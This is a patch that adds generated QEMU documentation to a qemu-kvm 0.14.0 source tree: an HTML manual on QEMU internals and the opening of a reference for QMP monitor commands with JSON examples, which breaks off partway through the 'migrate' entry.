diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-tech.html qemu-kvm-0.14.0+noroms/qemu-tech.html
--- qemu-kvm-0.14.0+noroms.orig/qemu-tech.html	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-tech.html	2014-02-19 10:12:30.000000000 -0500
@@ -0,0 +1,704 @@
+<html lang="en">
+<head>
+<title>QEMU Internals</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="description" content="QEMU Internals">
+<meta name="generator" content="makeinfo 4.13">
+<link title="Top" rel="top" href="#Top">
+<link href="http://www.gnu.org/software/texinfo/" rel="generator-home" title="Texinfo Homepage">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<style type="text/css"><!--
+  pre.display { font-family:inherit }
+  pre.format  { font-family:inherit }
+  pre.smalldisplay { font-family:inherit; font-size:smaller }
+  pre.smallformat  { font-family:inherit; font-size:smaller }
+  pre.smallexample { font-size:smaller }
+  pre.smalllisp    { font-size:smaller }
+  span.sc    { font-variant:small-caps }
+  span.roman { font-family:serif; font-weight:normal; } 
+  span.sansserif { font-family:sans-serif; font-weight:normal; } 
+--></style>
+</head>
+<body>
+<a name="Top"></a>
+
+<h2 class="unnumbered">QEMU Internals</h2>
+
+<div class="contents">
+<h2>Table of Contents</h2>
+<ul>
+<li><a name="toc_Top" href="#Top">QEMU Internals</a>
+<li><a name="toc_Introduction" href="#Introduction">1 Introduction</a>
+<ul>
+<li><a href="#intro_005ffeatures">1.1 Features</a>
+<li><a href="#intro_005fx86_005femulation">1.2 x86 and x86-64 emulation</a>
+<li><a href="#intro_005farm_005femulation">1.3 ARM emulation</a>
+<li><a href="#intro_005fmips_005femulation">1.4 MIPS emulation</a>
+<li><a href="#intro_005fppc_005femulation">1.5 PowerPC emulation</a>
+<li><a href="#intro_005fsparc_005femulation">1.6 Sparc32 and Sparc64 emulation</a>
+<li><a href="#intro_005fother_005femulation">1.7 Other CPU emulation</a>
+</li></ul>
+<li><a name="toc_QEMU-Internals" href="#QEMU-Internals">2 QEMU Internals</a>
+<ul>
+<li><a href="#QEMU-compared-to-other-emulators">2.1 QEMU compared to other emulators</a>
+<li><a href="#Portable-dynamic-translation">2.2 Portable dynamic translation</a>
+<li><a href="#Condition-code-optimisations">2.3 Condition code optimisations</a>
+<li><a href="#CPU-state-optimisations">2.4 CPU state optimisations</a>
+<li><a href="#Translation-cache">2.5 Translation cache</a>
+<li><a href="#Direct-block-chaining">2.6 Direct block chaining</a>
+<li><a href="#Self_002dmodifying-code-and-translated-code-invalidation">2.7 Self-modifying code and translated code invalidation</a>
+<li><a href="#Exception-support">2.8 Exception support</a>
+<li><a href="#MMU-emulation">2.9 MMU emulation</a>
+<li><a href="#Device-emulation">2.10 Device emulation</a>
+<li><a href="#Hardware-interrupts">2.11 Hardware interrupts</a>
+<li><a href="#User-emulation-specific-details">2.12 User emulation specific details</a>
+<ul>
+<li><a href="#User-emulation-specific-details">2.12.1 Linux system call translation</a>
+<li><a href="#User-emulation-specific-details">2.12.2 Linux signals</a>
+<li><a href="#User-emulation-specific-details">2.12.3 clone() system call and threads</a>
+<li><a href="#User-emulation-specific-details">2.12.4 Self-virtualization</a>
+</li></ul>
+<li><a href="#Bibliography">2.13 Bibliography</a>
+</li></ul>
+<li><a name="toc_Regression-Tests" href="#Regression-Tests">3 Regression Tests</a>
+<ul>
+<li><a href="#test_002di386">3.1 <samp><span class="file">test-i386</span></samp></a>
+<li><a href="#linux_002dtest">3.2 <samp><span class="file">linux-test</span></samp></a>
+<li><a href="#qruncom_002ec">3.3 <samp><span class="file">qruncom.c</span></samp></a>
+</li></ul>
+<li><a name="toc_Index" href="#Index">4 Index</a>
+</li></ul>
+</div>
+
+<p><a name="Introduction"></a>
+
+<h2 class="chapter">1 Introduction</h2>
+
+<p><a name="intro_features"></a>
+<a name="intro_005ffeatures"></a>
+
+<h3 class="section">1.1 Features</h3>
+
+<p>QEMU is a FAST! processor emulator using a portable dynamic
+translator.
+
+<p>QEMU has two operating modes:
+
+     <ul>
+<li>Full system emulation. In this mode (full platform virtualization),
+QEMU emulates a full system (usually a PC), including a processor and
+various peripherals. It can be used to launch several different
+Operating Systems at once without rebooting the host machine or to
+debug system code.
+
+     <li>User mode emulation. In this mode (application level virtualization),
+QEMU can launch processes compiled for one CPU on another CPU, however
+the Operating Systems must match. This can be used for example to ease
+cross-compilation and cross-debugging. 
+</ul>
+
+<p>As QEMU requires no host kernel driver to run, it is very safe and
+easy to use.
+
+<p>QEMU generic features:
+
+     <ul>
+<li>User space only or full system emulation.
+
+     <li>Using dynamic translation to native code for reasonable speed.
+
+     <li>Working on x86, x86_64 and PowerPC32/64 hosts. Being tested on ARM,
+HPPA, Sparc32 and Sparc64. Previous versions had some support for
+Alpha and S390 hosts, but TCG (see below) doesn't support those yet.
+
+     <li>Self-modifying code support.
+
+     <li>Precise exceptions support.
+
+     <li>The virtual CPU is a library (<code>libqemu</code>) which can be used
+in other projects (look at <samp><span class="file">qemu/tests/qruncom.c</span></samp> to have an
+example of user mode <code>libqemu</code> usage).
+
+     <li>Floating point library supporting both full software emulation and
+native host FPU instructions.
+
+</ul>
+
+<p>QEMU user mode emulation features:
+     <ul>
+<li>Generic Linux system call converter, including most ioctls.
+
+     <li>clone() emulation using native CPU clone() to use Linux scheduler for threads.
+
+     <li>Accurate signal handling by remapping host signals to target signals. 
+</ul>
+
+<p>Linux user emulator (Linux host only) can be used to launch the Wine
+Windows API emulator (<a href="http://www.winehq.org">http://www.winehq.org</a>). A Darwin user
+emulator (Darwin hosts only) exists and a BSD user emulator for BSD
+hosts is under development. It would also be possible to develop a
+similar user emulator for Solaris.
+
+<p>QEMU full system emulation features:
+     <ul>
+<li>QEMU uses a full software MMU for maximum portability.
+
+     <li>QEMU can optionally use an in-kernel accelerator, like kvm. The accelerators
+execute some of the guest code natively, while
+continuing to emulate the rest of the machine.
+
+     <li>Various hardware devices can be emulated and in some cases, host
+devices (e.g. serial and parallel ports, USB, drives) can be used
+transparently by the guest Operating System. Host device passthrough
+can be used for talking to external physical peripherals (e.g. a
+webcam, modem or tape drive).
+
+     <li>Symmetric multiprocessing (SMP) even on a host with a single CPU. On a
+SMP host system, QEMU can use only one CPU fully due to difficulty in
+implementing atomic memory accesses efficiently.
+
+</ul>
+
+<p><a name="intro_x86_emulation"></a>
+<a name="intro_005fx86_005femulation"></a>
+
+<h3 class="section">1.2 x86 and x86-64 emulation</h3>
+
+<p>QEMU x86 target features:
+
+     <ul>
+<li>The virtual x86 CPU supports 16 bit and 32 bit addressing with segmentation. 
+LDT/GDT and IDT are emulated. VM86 mode is also supported to run
+DOSEMU. There is some support for MMX/3DNow!, SSE, SSE2, SSE3, SSSE3,
+and SSE4 as well as x86-64 SVM.
+
+     <li>Support of host page sizes bigger than 4KB in user mode emulation.
+
+     <li>QEMU can emulate itself on x86.
+
+     <li>An extensive Linux x86 CPU test program is included <samp><span class="file">tests/test-i386</span></samp>. 
+It can be used to test other x86 virtual CPUs.
+
+</ul>
+
+<p>Current QEMU limitations:
+
+     <ul>
+<li>Limited x86-64 support.
+
+     <li>IPC syscalls are missing.
+
+     <li>The x86 segment limits and access rights are not tested at every
+memory access (yet). Hopefully, very few OSes seem to rely on that for
+normal use.
+
+</ul>
+
+<p><a name="intro_arm_emulation"></a>
+<a name="intro_005farm_005femulation"></a>
+
+<h3 class="section">1.3 ARM emulation</h3>
+
+     <ul>
+<li>Full ARM 7 user emulation.
+
+     <li>NWFPE FPU support included in user Linux emulation.
+
+     <li>Can run most ARM Linux binaries.
+
+</ul>
+
+<p><a name="intro_mips_emulation"></a>
+<a name="intro_005fmips_005femulation"></a>
+
+<h3 class="section">1.4 MIPS emulation</h3>
+
+     <ul>
+<li>The system emulation allows full MIPS32/MIPS64 Release 2 emulation,
+including privileged instructions, FPU and MMU, in both little and big
+endian modes.
+
+     <li>The Linux userland emulation can run many 32 bit MIPS Linux binaries.
+
+</ul>
+
+<p>Current QEMU limitations:
+
+     <ul>
+<li>Self-modifying code is not always handled correctly.
+
+     <li>64 bit userland emulation is not implemented.
+
+     <li>The system emulation is not complete enough to run real firmware.
+
+     <li>The watchpoint debug facility is not implemented.
+
+</ul>
+
+<p><a name="intro_ppc_emulation"></a>
+<a name="intro_005fppc_005femulation"></a>
+
+<h3 class="section">1.5 PowerPC emulation</h3>
+
+     <ul>
+<li>Full PowerPC 32 bit emulation, including privileged instructions,
+FPU and MMU.
+
+     <li>Can run most PowerPC Linux binaries.
+
+</ul>
+
+<p><a name="intro_sparc_emulation"></a>
+<a name="intro_005fsparc_005femulation"></a>
+
+<h3 class="section">1.6 Sparc32 and Sparc64 emulation</h3>
+
+     <ul>
+<li>Full SPARC V8 emulation, including privileged
+instructions, FPU and MMU. SPARC V9 emulation includes most privileged
+and VIS instructions, FPU and I/D MMU. Alignment is fully enforced.
+
+     <li>Can run most 32-bit SPARC Linux binaries, SPARC32PLUS Linux binaries and
+some 64-bit SPARC Linux binaries.
+
+</ul>
+
+<p>Current QEMU limitations:
+
+     <ul>
+<li>IPC syscalls are missing.
+
+     <li>Floating point exception support is buggy.
+
+     <li>Atomic instructions are not correctly implemented.
+
+     <li>There are still some problems with Sparc64 emulators.
+
+</ul>
+
+<p><a name="intro_other_emulation"></a>
+<a name="intro_005fother_005femulation"></a>
+
+<h3 class="section">1.7 Other CPU emulation</h3>
+
+<p>In addition to the above, QEMU supports emulation of other CPUs with
+varying levels of success. These are:
+
+     <ul>
+<li>Alpha
+<li>CRIS
+<li>M68k
+<li>SH4
+</ul>
+
+<p><a name="QEMU-Internals"></a>
+
+<h2 class="chapter">2 QEMU Internals</h2>
+
+<p><a name="QEMU-compared-to-other-emulators"></a>
+
+<h3 class="section">2.1 QEMU compared to other emulators</h3>
+
+<p>Like bochs [3], QEMU emulates an x86 CPU. But QEMU is much faster than
+bochs as it uses dynamic compilation. Bochs is closely tied to x86 PC
+emulation while QEMU can emulate several processors.
+
+<p>Like Valgrind [2], QEMU does user space emulation and dynamic
+translation. Valgrind is mainly a memory debugger while QEMU has no
+support for it (QEMU could be used to detect out of bound memory
+accesses as Valgrind, but it has no support to track uninitialised data
+as Valgrind does). The Valgrind dynamic translator generates better code
+than QEMU (in particular it does register allocation) but it is closely
+tied to an x86 host and target and has no support for precise exceptions
+and system emulation.
+
+<p>EM86 [4] is the closest project to user space QEMU (and QEMU still uses
+some of its code, in particular the ELF file loader). EM86 was limited
+to an alpha host and used a proprietary and slow interpreter (the
+interpreter part of the FX!32 Digital Win32 code translator [5]).
+
+<p>TWIN [6] is a Windows API emulator like Wine. It is less accurate than
+Wine but includes a protected mode x86 interpreter to launch x86 Windows
+executables. Such an approach has greater potential because most of the
+Windows API is executed natively but it is far more difficult to develop
+because all the data structures and function parameters exchanged
+between the API and the x86 code must be converted.
+
+<p>User mode Linux [7] was the only solution before QEMU to launch a
+Linux kernel as a process while not needing any host kernel
+patches. However, user mode Linux requires heavy kernel patches while
+QEMU accepts unpatched Linux kernels. The price to pay is that QEMU is
+slower.
+
+<p>The Plex86 [8] PC virtualizer is done in the same spirit as the now
+obsolete qemu-fast system emulator. It requires a patched Linux kernel
+to work (you cannot launch the same kernel on your PC), but the
+patches are really small. As it is a PC virtualizer (no emulation is
+done except for some privileged instructions), it has the potential of
+being faster than QEMU. The downside is that a complicated (and
+potentially unsafe) host kernel patch is needed.
+
+<p>The commercial PC Virtualizers (VMWare [9], VirtualPC [10], TwoOStwo
+[11]) are faster than QEMU, but they all need specific, proprietary
+and potentially unsafe host drivers. Moreover, they are unable to
+provide cycle exact simulation as an emulator can.
+
+<p>VirtualBox [12], Xen [13] and KVM [14] are based on QEMU. QEMU-SystemC
+[15] uses QEMU to simulate a system where some hardware devices are
+developed in SystemC.
+
+<p><a name="Portable-dynamic-translation"></a>
+
+<h3 class="section">2.2 Portable dynamic translation</h3>
+
+<p>QEMU is a dynamic translator. When it first encounters a piece of code,
+it converts it to the host instruction set. Usually dynamic translators
+are very complicated and highly CPU dependent. QEMU uses some tricks
+which make it relatively easily portable and simple while achieving good
+performances.
+
+<p>After the release of version 0.9.1, QEMU switched to a new method of
+generating code, Tiny Code Generator or TCG. TCG relaxes the
+dependency on the exact version of the compiler used. The basic idea
+is to split every target instruction into a couple of RISC-like TCG
+ops (see <code>target-i386/translate.c</code>). Some optimizations can be
+performed at this stage, including liveness analysis and trivial
+constant expression evaluation. TCG ops are then implemented in the
+host CPU back end, also known as TCG target (see
+<code>tcg/i386/tcg-target.c</code>). For more information, please take a
+look at <code>tcg/README</code>.
+
+<p><a name="Condition-code-optimisations"></a>
+
+<h3 class="section">2.3 Condition code optimisations</h3>
+
+<p>Lazy evaluation of CPU condition codes (<code>EFLAGS</code> register on x86)
+is important for CPUs where every instruction sets the condition
+codes. It tends to be less important on conventional RISC systems
+where condition codes are only updated when explicitly requested. On
+Sparc64, costly update of both 32 and 64 bit condition codes can be
+avoided with lazy evaluation.
+
+<p>Instead of computing the condition codes after each x86 instruction,
+QEMU just stores one operand (called <code>CC_SRC</code>), the result
+(called <code>CC_DST</code>) and the type of operation (called
+<code>CC_OP</code>). When the condition codes are needed, the condition
+codes can be calculated using this information. In addition, an
+optimized calculation can be performed for some instruction types like
+conditional branches.
+
+<p><code>CC_OP</code> is almost never explicitly set in the generated code
+because it is known at translation time.
+
+<p>The lazy condition code evaluation is used on x86, m68k, cris and
+Sparc. ARM uses a simplified variant for the N and Z flags.
+
+<p><a name="CPU-state-optimisations"></a>
+
+<h3 class="section">2.4 CPU state optimisations</h3>
+
+<p>The target CPUs have many internal states which change the way it
+evaluates instructions. In order to achieve a good speed, the
+translation phase considers that some state information of the virtual
+CPU cannot change in it. The state is recorded in the Translation
+Block (TB). If the state changes (e.g. privilege level), a new TB will
+be generated and the previous TB won't be used anymore until the state
+matches the state recorded in the previous TB. For example, if the SS,
+DS and ES segments have a zero base, then the translator does not even
+generate an addition for the segment base.
+
+<p>[The FPU stack pointer register is not handled that way yet].
+
+<p><a name="Translation-cache"></a>
+
+<h3 class="section">2.5 Translation cache</h3>
+
+<p>A 16 MByte cache holds the most recently used translations. For
+simplicity, it is completely flushed when it is full. A translation unit
+contains just a single basic block (a block of x86 instructions
+terminated by a jump or by a virtual CPU state change which the
+translator cannot deduce statically).
+
+<p><a name="Direct-block-chaining"></a>
+
+<h3 class="section">2.6 Direct block chaining</h3>
+
+<p>After each translated basic block is executed, QEMU uses the simulated
+Program Counter (PC) and other cpu state informations (such as the CS
+segment base value) to find the next basic block.
+
+<p>In order to accelerate the most common cases where the new simulated PC
+is known, QEMU can patch a basic block so that it jumps directly to the
+next one.
+
+<p>The most portable code uses an indirect jump. An indirect jump makes
+it easier to make the jump target modification atomic. On some host
+architectures (such as x86 or PowerPC), the <code>JUMP</code> opcode is
+directly patched so that the block chaining has no overhead.
+
+<p><a name="Self-modifying-code-and-translated-code-invalidation"></a>
+<a name="Self_002dmodifying-code-and-translated-code-invalidation"></a>
+
+<h3 class="section">2.7 Self-modifying code and translated code invalidation</h3>
+
+<p>Self-modifying code is a special challenge in x86 emulation because no
+instruction cache invalidation is signaled by the application when code
+is modified.
+
+<p>When translated code is generated for a basic block, the corresponding
+host page is write protected if it is not already read-only. Then, if
+a write access is done to the page, Linux raises a SEGV signal. QEMU
+then invalidates all the translated code in the page and enables write
+accesses to the page.
+
+<p>Correct translated code invalidation is done efficiently by maintaining
+a linked list of every translated block contained in a given page. Other
+linked lists are also maintained to undo direct block chaining.
+
+<p>On RISC targets, correctly written software uses memory barriers and
+cache flushes, so some of the protection above would not be
+necessary. However, QEMU still requires that the generated code always
+matches the target instructions in memory in order to handle
+exceptions correctly.
+
+<p><a name="Exception-support"></a>
+
+<h3 class="section">2.8 Exception support</h3>
+
+<p>longjmp() is used when an exception such as division by zero is
+encountered.
+
+<p>The host SIGSEGV and SIGBUS signal handlers are used to get invalid
+memory accesses. The simulated program counter is found by
+retranslating the corresponding basic block and by looking where the
+host program counter was at the exception point.
+
+<p>The virtual CPU cannot retrieve the exact <code>EFLAGS</code> register because
+in some cases it is not computed because of condition code
+optimisations. It is not a big concern because the emulated code can
+still be restarted in any cases.
+
+<p><a name="MMU-emulation"></a>
+
+<h3 class="section">2.9 MMU emulation</h3>
+
+<p>For system emulation QEMU supports a soft MMU. In that mode, the MMU
+virtual to physical address translation is done at every memory
+access. QEMU uses an address translation cache to speed up the
+translation.
+
+<p>In order to avoid flushing the translated code each time the MMU
+mappings change, QEMU uses a physically indexed translation cache. It
+means that each basic block is indexed with its physical address.
+
+<p>When MMU mappings change, only the chaining of the basic blocks is
+reset (i.e. a basic block can no longer jump directly to another one).
+
+<p><a name="Device-emulation"></a>
+
+<h3 class="section">2.10 Device emulation</h3>
+
+<p>Systems emulated by QEMU are organized by boards. At initialization
+phase, each board instantiates a number of CPUs, devices, RAM and
+ROM. Each device in turn can assign I/O ports or memory areas (for
+MMIO) to its handlers. When the emulation starts, an access to the
+ports or MMIO memory areas assigned to the device causes the
+corresponding handler to be called.
+
+<p>RAM and ROM are handled more optimally, only the offset to the host
+memory needs to be added to the guest address.
+
+<p>The video RAM of VGA and other display cards is special: it can be
+read or written directly like RAM, but write accesses cause the memory
+to be marked with VGA_DIRTY flag as well.
+
+<p>QEMU supports some device classes like serial and parallel ports, USB,
+drives and network devices, by providing APIs for easier connection to
+the generic, higher level implementations. The API hides the
+implementation details from the devices, like native device use or
+advanced block device formats like QCOW.
+
+<p>Usually the devices implement a reset method and register support for
+saving and loading of the device state. The devices can also use
+timers, especially together with the use of bottom halves (BHs).
+
+<p><a name="Hardware-interrupts"></a>
+
+<h3 class="section">2.11 Hardware interrupts</h3>
+
+<p>In order to be faster, QEMU does not check at every basic block if an
+hardware interrupt is pending. Instead, the user must asynchronously
+call a specific function to tell that an interrupt is pending. This
+function resets the chaining of the currently executing basic
+block. It ensures that the execution will return soon in the main loop
+of the CPU emulator. Then the main loop can test if the interrupt is
+pending and handle it.
+
+<p><a name="User-emulation-specific-details"></a>
+
+<h3 class="section">2.12 User emulation specific details</h3>
+
+<h4 class="subsection">2.12.1 Linux system call translation</h4>
+
+<p>QEMU includes a generic system call translator for Linux. It means that
+the parameters of the system calls can be converted to fix the
+endianness and 32/64 bit issues. The IOCTLs are converted with a generic
+type description system (see <samp><span class="file">ioctls.h</span></samp> and <samp><span class="file">thunk.c</span></samp>).
+
+<p>QEMU supports host CPUs which have pages bigger than 4KB. It records all
+the mappings the process does and try to emulated the <code>mmap()</code>
+system calls in cases where the host <code>mmap()</code> call would fail
+because of bad page alignment.
+
+<h4 class="subsection">2.12.2 Linux signals</h4>
+
+<p>Normal and real-time signals are queued along with their information
+(<code>siginfo_t</code>) as it is done in the Linux kernel. Then an interrupt
+request is done to the virtual CPU. When it is interrupted, one queued
+signal is handled by generating a stack frame in the virtual CPU as the
+Linux kernel does. The <code>sigreturn()</code> system call is emulated to return
+from the virtual signal handler.
+
+<p>Some signals (such as SIGALRM) directly come from the host. Other
+signals are synthesized from the virtual CPU exceptions such as SIGFPE
+when a division by zero is done (see <code>main.c:cpu_loop()</code>).
+
+<p>The blocked signal mask is still handled by the host Linux kernel so
+that most signal system calls can be redirected directly to the host
+Linux kernel. Only the <code>sigaction()</code> and <code>sigreturn()</code> system
+calls need to be fully emulated (see <samp><span class="file">signal.c</span></samp>).
+
+<h4 class="subsection">2.12.3 clone() system call and threads</h4>
+
+<p>The Linux clone() system call is usually used to create a thread. QEMU
+uses the host clone() system call so that real host threads are created
+for each emulated thread. One virtual CPU instance is created for each
+thread.
+
+<p>The virtual x86 CPU atomic operations are emulated with a global lock so
+that their semantic is preserved.
+
+<p>Note that currently there are still some locking issues in QEMU. In
+particular, the translated cache flush is not protected yet against
+reentrancy.
+
+<h4 class="subsection">2.12.4 Self-virtualization</h4>
+
+<p>QEMU was conceived so that ultimately it can emulate itself. Although
+it is not very useful, it is an important test to show the power of the
+emulator.
+
+<p>Achieving self-virtualization is not easy because there may be address
+space conflicts. QEMU user emulators solve this problem by being an
+executable ELF shared object as the ld-linux.so ELF interpreter. That
+way, it can be relocated at load time.
+
+<p><a name="Bibliography"></a>
+
+<h3 class="section">2.13 Bibliography</h3>
+
+     <dl>
+<dt>[1]<dd><a href="http://citeseer.nj.nec.com/piumarta98optimizing.html">http://citeseer.nj.nec.com/piumarta98optimizing.html</a>, Optimizing
+direct threaded code by selective inlining (1998) by Ian Piumarta, Fabio
+Riccardi.
+
+     <br><dt>[2]<dd><a href="http://developer.kde.org/~sewardj/">http://developer.kde.org/~sewardj/</a>, Valgrind, an open-source
+memory debugger for x86-GNU/Linux, by Julian Seward.
+
+     <br><dt>[3]<dd><a href="http://bochs.sourceforge.net/">http://bochs.sourceforge.net/</a>, the Bochs IA-32 Emulator Project,
+by Kevin Lawton et al.
+
+     <br><dt>[4]<dd><a href="http://www.cs.rose-hulman.edu/~donaldlf/em86/index.html">http://www.cs.rose-hulman.edu/~donaldlf/em86/index.html</a>, the EM86
+x86 emulator on Alpha-Linux.
+
+     <br><dt>[5]<dd><a href="http://www.usenix.org/publications/library/proceedings/usenix-nt97/full_papers/chernoff/chernoff.pdf">http://www.usenix.org/publications/library/proceedings/usenix-nt97/full_papers/chernoff/chernoff.pdf</a>,
+DIGITAL FX!32: Running 32-Bit x86 Applications on Alpha NT, by Anton
+Chernoff and Ray Hookway.
+
+     <br><dt>[6]<dd><a href="http://www.willows.com/">http://www.willows.com/</a>, Windows API library emulation from
+Willows Software.
+
+     <br><dt>[7]<dd><a href="http://user-mode-linux.sourceforge.net/">http://user-mode-linux.sourceforge.net/</a>,
+The User-mode Linux Kernel.
+
+     <br><dt>[8]<dd><a href="http://www.plex86.org/">http://www.plex86.org/</a>,
+The new Plex86 project.
+
+     <br><dt>[9]<dd><a href="http://www.vmware.com/">http://www.vmware.com/</a>,
+The VMWare PC virtualizer.
+
+     <br><dt>[10]<dd><a href="http://www.microsoft.com/windowsxp/virtualpc/">http://www.microsoft.com/windowsxp/virtualpc/</a>,
+The VirtualPC PC virtualizer.
+
+     <br><dt>[11]<dd><a href="http://www.twoostwo.org/">http://www.twoostwo.org/</a>,
+The TwoOStwo PC virtualizer.
+
+     <br><dt>[12]<dd><a href="http://virtualbox.org/">http://virtualbox.org/</a>,
+The VirtualBox PC virtualizer.
+
+     <br><dt>[13]<dd><a href="http://www.xen.org/">http://www.xen.org/</a>,
+The Xen hypervisor.
+
+     <br><dt>[14]<dd><a href="http://kvm.qumranet.com/kvmwiki/Front_Page">http://kvm.qumranet.com/kvmwiki/Front_Page</a>,
+Kernel Based Virtual Machine (KVM).
+
+     <br><dt>[15]<dd><a href="http://www.greensocs.com/projects/QEMUSystemC">http://www.greensocs.com/projects/QEMUSystemC</a>,
+QEMU-SystemC, a hardware co-simulator.
+
+</dl>
+
+<p><a name="Regression-Tests"></a>
+
+<h2 class="chapter">3 Regression Tests</h2>
+
+<p>In the directory <samp><span class="file">tests/</span></samp>, various interesting testing programs
+are available. They are used for regression testing.
+
+<p><a name="test-i386"></a>
+<a name="test_002di386"></a>
+
+<h3 class="section">3.1 <samp><span class="file">test-i386</span></samp></h3>
+
+<p>This program executes most of the 16 bit and 32 bit x86 instructions and
+generates a text output. It can be compared with the output obtained with
+a real CPU or another emulator. The target <code>make test</code> runs this
+program and a <code>diff</code> on the generated output.
+
+<p>The Linux system call <code>modify_ldt()</code> is used to create x86 selectors
+to test some 16 bit addressing and 32 bit with segmentation cases.
+
+<p>The Linux system call <code>vm86()</code> is used to test vm86 emulation.
+
+<p>Various exceptions are raised to test most of the x86 user space
+exception reporting.
+
+<p><a name="linux-test"></a>
+<a name="linux_002dtest"></a>
+
+<h3 class="section">3.2 <samp><span class="file">linux-test</span></samp></h3>
+
+<p>This program tests various Linux system calls. It is used to verify
+that the system call parameters are correctly converted between target
+and host CPUs.
+
+<p><a name="qruncom.c"></a>
+<a name="qruncom_002ec"></a>
+
+<h3 class="section">3.3 <samp><span class="file">qruncom.c</span></samp></h3>
+
+<p>Example of usage of <code>libqemu</code> to emulate a user mode i386 CPU.
+
+<p><a name="Index"></a>
+
+<h2 class="chapter">4 Index</h2>
+
+<ul class="index-cp" compact>
+</ul></body></html>
+
+<!--
+
+Local Variables:
+coding: utf-8
+End:
+
+-->
diff -Nurp qemu-kvm-0.14.0+noroms.orig/QMP/qmp-commands.txt qemu-kvm-0.14.0+noroms/QMP/qmp-commands.txt
--- qemu-kvm-0.14.0+noroms.orig/QMP/qmp-commands.txt	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/QMP/qmp-commands.txt	2014-02-19 10:12:22.000000000 -0500
@@ -0,0 +1,1354 @@
+                        QMP Supported Commands
+                        ----------------------
+
+This document describes all commands currently supported by QMP.
+
+Most of the time their usage is exactly the same as in the user Monitor, this
+means that any other document which also describe commands (the manpage,
+QEMU's manual, etc) can and should be consulted.
+
+QMP has two types of commands: regular and query commands. Regular commands
+usually change the Virtual Machine's state someway, while query commands just
+return information. The sections below are divided accordingly.
+
+It's important to observe that all communication examples are formatted in
+a reader-friendly way, so that they're easier to understand. However, in real
+protocol usage, they're emitted as a single line.
+
+Also, the following notation is used to denote data flow:
+
+-> data issued by the Client
+<- Server data response
+
+Please, refer to the QMP specification (QMP/qmp-spec.txt) for detailed
+information on the Server command and response formats.
+
+NOTE: This document is temporary and will be replaced soon.
+
+1. Stability Considerations
+===========================
+
+The current QMP command set (described in this file) may be useful for a
+number of use cases, however it's limited and several commands have bad
+defined semantics, specially with regard to command completion.
+
+These problems are going to be solved incrementally in the next QEMU releases
+and we're going to establish a deprecation policy for badly defined commands.
+
+If you're planning to adopt QMP, please observe the following:
+
+    1. The deprecation policy will take efect and be documented soon, please
+       check the documentation of each used command as soon as a new release of
+       QEMU is available
+
+    2. DO NOT rely on anything which is not explicit documented
+
+    3. Errors, in special, are not documented. Applications should NOT check
+       for specific errors classes or data (it's strongly recommended to only
+       check for the "error" key)
+
+2. Regular Commands
+===================
+
+Server's responses in the examples below are always a success response, please
+refer to the QMP specification for more details on error responses.
+
+quit
+----
+
+Quit the emulator.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "quit" }
+<- { "return": {} }
+
+eject
+-----
+
+Eject a removable medium.
+
+Arguments: 
+
+- force: force ejection (json-bool, optional)
+- device: device name (json-string)
+
+Example:
+
+-> { "execute": "eject", "arguments": { "device": "ide1-cd0" } }
+<- { "return": {} }
+
+Note: The "force" argument defaults to false.
+
+change
+------
+
+Change a removable medium or VNC configuration.
+
+Arguments:
+
+- "device": device name (json-string)
+- "target": filename or item (json-string)
+- "arg": additional argument (json-string, optional)
+
+Examples:
+
+1. Change a removable medium
+
+-> { "execute": "change",
+             "arguments": { "device": "ide1-cd0",
+                            "target": "/srv/images/Fedora-12-x86_64-DVD.iso" } }
+<- { "return": {} }
+
+2. Change VNC password
+
+-> { "execute": "change",
+             "arguments": { "device": "vnc", "target": "password",
+                            "arg": "foobar1" } }
+<- { "return": {} }
+
+screendump
+----------
+
+Save screen into PPM image.
+
+Arguments:
+
+- "filename": file path (json-string)
+
+Example:
+
+-> { "execute": "screendump", "arguments": { "filename": "/tmp/image" } }
+<- { "return": {} }
+
+stop
+----
+
+Stop the emulator.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "stop" }
+<- { "return": {} }
+
+cont
+----
+
+Resume emulation.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "cont" }
+<- { "return": {} }
+
+system_reset
+------------
+
+Reset the system.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "system_reset" }
+<- { "return": {} }
+
+system_powerdown
+----------------
+
+Send system power down event.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "system_powerdown" }
+<- { "return": {} }
+
+device_add
+----------
+
+Add a device.
+
+Arguments:
+
+- "driver": the name of the new device's driver (json-string)
+- "bus": the device's parent bus (device tree path, json-string, optional)
+- "id": the device's ID, must be unique (json-string)
+- device properties
+
+Example:
+
+-> { "execute": "device_add", "arguments": { "driver": "e1000", "id": "net1" } }
+<- { "return": {} }
+
+Notes:
+
+(1) For detailed information about this command, please refer to the
+    'docs/qdev-device-use.txt' file.
+
+(2) It's possible to list device properties by running QEMU with the
+    "-device DEVICE,\?" command-line argument, where DEVICE is the device's name
+
+device_del
+----------
+
+Remove a device.
+
+Arguments:
+
+- "id": the device's ID (json-string)
+
+Example:
+
+-> { "execute": "device_del", "arguments": { "id": "net1" } }
+<- { "return": {} }
+
+cpu
+---
+
+Set the default CPU.
+
+Arguments:
+
+- "index": the CPU's index (json-int)
+
+Example:
+
+-> { "execute": "cpu", "arguments": { "index": 0 } }
+<- { "return": {} }
+
+Note: CPUs' indexes are obtained with the 'query-cpus' command.
+
+memsave
+-------
+
+Save to disk virtual memory dump starting at 'val' of size 'size'.
+
+Arguments:
+
+- "val": the starting address (json-int)
+- "size": the memory size, in bytes (json-int)
+- "filename": file path (json-string)
+
+Example:
+
+-> { "execute": "memsave",
+             "arguments": { "val": 10,
+                            "size": 100,
+                            "filename": "/tmp/virtual-mem-dump" } }
+<- { "return": {} }
+
+Note: Depends on the current CPU.
+
+pmemsave
+--------
+
+Save to disk physical memory dump starting at 'val' of size 'size'.
+
+Arguments:
+
+- "val": the starting address (json-int)
+- "size": the memory size, in bytes (json-int)
+- "filename": file path (json-string)
+
+Example:
+
+-> { "execute": "pmemsave",
+             "arguments": { "val": 10,
+                            "size": 100,
+                            "filename": "/tmp/physical-mem-dump" } }
+<- { "return": {} }
+
+migrate
+-------
+
+Migrate to URI.
+
+Arguments:
+
+- "blk": block migration, full disk copy (json-bool, optional)
+- "inc": incremental disk copy (json-bool, optional)
